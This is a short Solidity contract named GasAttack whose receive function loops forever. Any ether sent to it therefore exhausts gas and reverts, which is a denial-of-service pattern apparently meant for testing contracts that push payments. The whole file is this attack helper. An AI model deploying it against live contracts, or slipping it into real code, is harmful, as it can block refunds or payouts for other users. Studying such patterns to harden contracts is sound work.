pragma solidity ^0.8.0;

contract GasAttack {
    receive() external payable {
        uint256 i = 0;
        while (true) {
            i++;
        }
    }
}